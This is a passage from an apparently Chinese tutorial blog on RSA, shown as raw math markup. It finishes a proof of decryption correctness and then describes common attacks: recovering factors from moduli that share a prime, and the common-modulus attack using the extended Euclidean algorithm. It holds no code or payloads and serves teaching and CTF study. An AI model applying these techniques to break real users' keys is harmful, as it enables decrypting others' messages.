style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.098em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>也就是说<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>≡</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">c^d\mod{n}\equiv m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></p></li><li><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>不互质的时候</p><p>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>&lt;</mo><mi>n</mi><mo separator="true">,</mo><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m&lt;n,n=pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>或者<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>的倍数，意为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>t</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">m=t*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，这里的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span>为正整数</p><p>也就是说<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(m,p)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>由费马小定理，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(p)}=1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>，两边同时进行<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>次方得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)}\equiv1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span>，</p><p>那么存在正整数n，使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mo>+</mo><mi>n</mi><mo>∗</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)}=1+n*p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></p><p>两边同时乘以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>t</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">m=t*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>m</mi><mo>+</mo><mi>n</mi><mi>t</mi><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)+1}= m+nt*p*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，也即是</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>≡</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m^{\varphi(n)+1}\equiv m\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p></li></ul><h1 id="Rsa常见攻击方式">Rsa常见攻击方式</h1><h2 id="关于模数的攻击">关于模数的攻击</h2><h3 id="模不互素">模不互素</h3><p>攻击原理</p><p>当两个模数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>不互素的时候，其公因子就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>或<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，因此可以直接将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>分解</p><h3 id="共模攻击">共模攻击</h3><p>生成秘钥的过程中使用了相同的模数n，此时用不同的秘钥e加密同一信息m：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_1=m^{e_1}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_2=m^{e_2}\mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>若是两次生成的公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><msub><mi>e</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\ e_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\ e_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 互素，则根据扩展欧几里得算法，存在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span> 使得：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mo>∗</mo><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><mi>t</mi><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">s*{e_1}+t*{e_2}=gcd(e_1,e_2)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p>所以</p><p><span class="katex-display"><span 